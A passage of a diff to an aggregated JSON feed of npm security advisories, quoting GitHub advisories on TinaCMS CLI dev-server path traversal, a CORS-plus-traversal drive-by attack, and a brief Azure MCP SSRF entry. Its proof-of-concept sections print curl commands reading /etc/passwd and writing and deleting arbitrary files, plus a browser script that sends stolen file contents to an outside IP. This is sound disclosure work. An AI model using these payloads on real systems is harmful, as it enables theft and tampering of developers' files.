+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The TinaCMS CLI development server exposes media endpoints that are vulnerable to path traversal, allowing attackers to read and write arbitrary files on the filesystem outside the intended media directory.</p>\n<h2 id=\"details\">Details</h2>\n<p>When running tinacms dev, the CLI starts a local HTTP server (default port 4001) exposing endpoints such as:</p>\n<ul>\n<li><p>/media/list/*</p>\n</li>\n<li><p>/media/upload/*</p>\n</li>\n<li><p>/media/*</p>\n</li>\n</ul>\n<p>These endpoints process user-controlled path segments using decodeURI() and path.join() without validating that the resolved path remains within the configured media directory.</p>\n<h3 id=\"vulnerable-code\">Vulnerable code</h3>\n<pre><code>bb.on('file', async (_name, file, _info) =&gt; {\n      const fullPath = decodeURI(req.url?.slice('/media/upload/'.length));\n      const saveTo = path.join(mediaFolder, ...fullPath.split('/'));\n// No validation that saveTo remains within mediaFolder\n      await fs.ensureDir(path.dirname(saveTo));\n      file.pipe(fs.createWriteStream(saveTo));\n    });\n</code></pre>\n<h2 id=\"poc\">PoC</h2>\n<p><strong>Arbitrary File Read</strong></p>\n<pre><code>curl \"http://localhost:4001/media/list/../../../etc/passwd\"\n</code></pre>\n<p>Result:</p>\n<img width=\"889\" height=\"280\" alt=\"image(1)\" src=\"https://github.com/user-attachments/assets/a878a86a-71db-46ed-abda-3d4ddba692e0\">\n\n\n<p><strong>Arbitrary File Write</strong></p>\n<pre><code>echo \"ATTACKER_CONTROLLED_CONTENT\" &gt; /tmp/payload.txt\n\ncurl --path-as-is -X POST \\\n  \"http://localhost:4001/media/upload/../../../../../../tmp/pwned.txt\" \\\n  -F \"file=@/tmp/payload.txt\"\ncat /tmp/pwned.txt\n</code></pre>\n<p>Result:\n<img width=\"1320\" height=\"84\" alt=\"image(8)\" src=\"https://github.com/user-attachments/assets/8bd5046b-0456-474f-ab96-4e18a421997c\"></p>\n<p><strong>Arbitrary File Delete</strong></p>\n<pre><code>echo \"delete_me\" &gt; /tmp/delete-test.txt\ncat /tmp/delete-test.txt # confirms file exists\ncurl --path-as-is -X DELETE \\\n\"http://localhost:4001/media/../../../../../../tmp/delete-test.txt\"\ncat /tmp/delete-test.txt # \"No such file or directory\"\n</code></pre>\n<img width=\"1135\" height=\"105\" alt=\"image\" src=\"https://github.com/user-attachments/assets/64c24b83-0259-4a12-969d-98c8e8cc81ca\">\n\n<h2 id=\"impact\">Impact</h2>\n<p>An attacker who can reach the TinaCMS CLI dev server can:</p>\n<ul>\n<li><p>Read arbitrary files (e.g. /etc/passwd, .env, SSH keys)</p>\n</li>\n<li><p>Write arbitrary files anywhere writable by the server process</p>\n</li>\n<li><p>Delete or overwrite files, depending on endpoint usage</p>\n</li>\n<li><p>Escalate to code execution in realistic development setups by overwriting executable scripts, configuration files, or watched source files</p>\n</li>\n</ul>\n<h2 id=\"attack-surface\">Attack Surface</h2>\n<p>The dev server binds to localhost by default, but exploitation is realistic in:</p>\n<ul>\n<li><p>Cloud IDEs (Codespaces, Gitpod)</p>\n</li>\n<li><p>Docker or VM setups with port forwarding</p>\n</li>\n<li><p>Misconfigured dev environments binding to 0.0.0.0</p>\n</li>\n<li><p>Local malware or malicious dependencies</p>\n</li>\n</ul>\n<p>The server also enables permissive CORS, which may allow browser-based exploitation if the dev server is externally reachable, but CORS is not required for exploitation.</p>\n<h2 id=\"recommended-fix\">Recommended Fix</h2>\n<ul>\n<li><p>Resolve paths to absolute form</p>\n</li>\n<li><p>Enforce that resolved paths remain within the media root</p>\n</li>\n<li><p>Reject .. path segments and absolute paths</p>\n</li>\n<li><p>Consider authentication or token protection for dev server endpoints</p>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tinacms/tinacms/security/advisories/GHSA-2f24-mg4x-534q\">https://github.com/tinacms/tinacms/security/advisories/GHSA-2f24-mg4x-534q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-28793\">https://nvd.nist.gov/vuln/detail/CVE-2026-28793</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2f24-mg4x-534q\">https://github.com/advisories/GHSA-2f24-mg4x-534q</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T20:32:29.000Z",
+          "date_published": "2026-03-12T20:32:26.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-2f24-mg4x-534q"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "847c461db5c339dcaf6a00e2c0c6f311",
+        "url": "https://github.com/advisories/GHSA-8pw3-9m7f-q734",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@tinacms/cli] TinaCMS CLI Dev Server Vulnerable to Cross-Origin File Exfiltration via CORS Misconfiguration + Path Traversal in TinaCMS",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-8pw3-9m7f-q734"
+          ],
+          "content_hash": "sha256:e6c7473f2bf3ebf4cb32678227fef777323cf7623e6ffe51688c8975176b77ec"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The TinaCMS CLI dev server combines a permissive CORS configuration (Access-Control-Allow-Origin: *) with the path traversal vulnerability (previously reported) to enable a browser-based drive-by attack. A remote attacker can enumerate the filesystem, write arbitrary files, and delete arbitrary files on developer's machines by simply tricking them into visiting a malicious website while tinacms dev is running.</p>\n<h2 id=\"details\">Details</h2>\n<p>The TinaCMS dev server sets permissive CORS headers that allow <strong>any origin</strong> to make cross-origin requests:</p>\n<ul>\n<li>packages/@tinacms/cli/src/server/server.ts:</li>\n</ul>\n<pre><code>  app.use(cors());\n</code></pre>\n<ul>\n<li>packages/@tinacms/cli/src/next/vite/plugins.ts:</li>\n</ul>\n<pre><code>     server.middlewares.use(cors());\n</code></pre>\n<p>When combined with the path traversal vulnerability, this creates a complete attack chain.</p>\n<h2 id=\"attack-scenario\">Attack Scenario</h2>\n<h3 id=\"prerequisites\">Prerequisites</h3>\n<ol>\n<li>Developer runs <code>tinacms dev</code> (default port 4001) </li>\n<li>Developer visits attacker's website while TinaCMS is running</li>\n</ol>\n<p><strong>No other conditions required</strong> - the dev server doesn't need to be:</p>\n<ul>\n<li>Exposed to the internet</li>\n<li>Bound to 0.0.0.0</li>\n<li>Accessible outside localhost</li>\n</ul>\n<h3 id=\"attack-flow\">Attack Flow</h3>\n<ol>\n<li>Developer starts TinaCMS: <code>tinacms dev</code></li>\n<li>Developer browses the web (checking email, social media, etc.)</li>\n<li>Developer unknowingly visits attacker-controlled page (malicious ad, compromised site, etc.)</li>\n<li>Attacker's JavaScript exploits CORS + path traversal to read sensitive files</li>\n<li>Files are exfiltrated to attacker's server</li>\n</ol>\n<h2 id=\"poc\">PoC</h2>\n<h3 id=\"attackers-malicious-website-evilhtml\">Attacker's Malicious Website (evil.html):</h3>\n<pre><code>&lt;script&gt;\nfetch('http://localhost:4001/../../../etc/passwd')\n  .then(r =&gt; r.text())\n  .then(data =&gt; {\n    // Exfil via GET\n    const img = new Image();\n    img.src = 'http://192.168.11.117:8080/exfil?data=' + encodeURIComponent(data);\n  });\n&lt;/script&gt;\n</code></pre>\n<h3 id=\"demonstration\">Demonstration</h3>\n<p><strong>Step 1:</strong> Start TinaCMS dev server</p>\n<pre><code class=\"language-bash\">tinacms dev\n# Server running on http://localhost:4001\n</code></pre>\n<p><strong>Step 2:</strong> Host evil.html on attacker server</p>\n<pre><code class=\"language-bash\">python3 -m http.server 8000\n</code></pre>\n<p><strong>Step 3:</strong> Developer visits <code>http://attacker-server:8000/evil.html</code></p>\n<p><strong>Result:</strong> The browser makes cross-origin requests to localhost:4001.\nBecause cors() returns Access-Control-Allow-Origin: *, the browser\nallows the JavaScript to read the responses. Directory listings from\noutside the media directory are sent to the attacker's server.\n<img width=\"1900\" height=\"366\" alt=\"image\" src=\"https://github.com/user-attachments/assets/72fdd31d-dd93-4728-9a4b-4d7d66d33617\"></p>\n<h2 id=\"impact\">Impact</h2>\n<h3 id=\"who-is-affected\">Who is affected</h3>\n<p>Every developer running <code>tinacms dev</code> is vulnerable while the dev server is active. No special configuration is required the default setup is exploitable.</p>\n<h3 id=\"what-an-attacker-achieves\">What an attacker achieves</h3>\n<p>By hosting a malicious webpage (or injecting script via a compromised ad network, XSS on a forum, etc.), the attacker can silently:</p>\n<ol>\n<li><strong>Enumerate the developer's filesystem</strong> directory listings via <code>/media/list/</code> with path traversal reveal file and folder names\nacross the entire filesystem</li>\n<li><strong>Discover sensitive files</strong> locate <code>.env</code>, <code>.git/config</code>,  SSH keys, cloud credentials, database configs</li>\n<li><strong>Write arbitrary files</strong> via <code>/media/upload/</code> with path traversal, the attacker can overwrite project source files, inject backdoors, or modify build scripts</li>\n<li><strong>Delete arbitrary files</strong> via <code>/media/</code> DELETE with path traversal</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tinacms/tinacms/security/advisories/GHSA-8pw3-9m7f-q734\">https://github.com/tinacms/tinacms/security/advisories/GHSA-8pw3-9m7f-q734</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-28792\">https://nvd.nist.gov/vuln/detail/CVE-2026-28792</a></li>\n<li><a href=\"https://github.com/tinacms/tinacms/pull/6450\">https://github.com/tinacms/tinacms/pull/6450</a></li>\n<li><a href=\"https://github.com/tinacms/tinacms/commit/56d533e610a520ba66b3e58f3a0dc03487d5d5d7\">https://github.com/tinacms/tinacms/commit/56d533e610a520ba66b3e58f3a0dc03487d5d5d7</a></li>\n<li><a href=\"https://github.com/tinacms/tinacms/releases/tag/%40tinacms%2Fcli%402.1.8\">https://github.com/tinacms/tinacms/releases/tag/%40tinacms%2Fcli%402.1.8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8pw3-9m7f-q734\">https://github.com/advisories/GHSA-8pw3-9m7f-q734</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T20:32:10.000Z",
+          "date_published": "2026-03-12T20:32:09.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-8pw3-9m7f-q734"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "17e1f97d9d135d2b86f7af10aafe18e3",
+        "url": "https://github.com/advisories/GHSA-hhfx-wfvq-7g9c",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@azure/mcp] Azure MCP Server has Server-Side Request Forgery issue that allows authorized attacker to elevate privileges over a network",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-hhfx-wfvq-7g9c"
+          ],
+          "content_hash": "sha256:b153b252b43f3af3b908e3afd6f948acc85d4966c39298d821caffae0af335c5"
+        },
+        "signals": {
+          "severity": {
+            "level": "low",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "npm Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
+              "evidence_url": "https://github.com/advisories/GHSA-hhfx-wfvq-7g9c"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<p>Server-Side Request Forgery (SSRF) in Azure MCP Server allows an authorized attacker to elevate privileges over a network.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-26118\">https://nvd.nist.gov/vuln/detail/CVE-2026-26118</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-26118\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-26118</a></li>\n<li><a href=\"https://github.com/microsoft/mcp/commit/804ff60293206c4d8e832f772097238561bf2c34\">https://github.com/microsoft/mcp/commit/804ff60293206c4d8e832f772097238561bf2c34</a></li>\n<li><a href=\"https://github.com/microsoft/mcp/releases/tag/Azure.Mcp.Server-1.0.2\">https://github.com/microsoft/mcp/releases/tag/Azure.Mcp.Server-1.0.2</a></li>\n<li><a href=\"https://github.com/microsoft/mcp/releases/tag/Azure.Mcp.Server-2.0.0-beta.17\">https://github.com/microsoft/mcp/releases/tag/Azure.Mcp.Server-2.0.0-beta.17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hhfx-wfvq-7g9c\">https://github.com/advisories/GHSA-hhfx-wfvq-7g9c</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T19:53:07.000Z",
+          "date_published": "2026-03-10T18:31:21.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-hhfx-wfvq-7g9c"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      }
+    ],
+    "updated": [],
+    "removed": []
+  },
+  "counts": {
+    "items": 20,
+    "updated": 0,
+    "removed": 0
+  },
+  "integrity_reset": false
+}
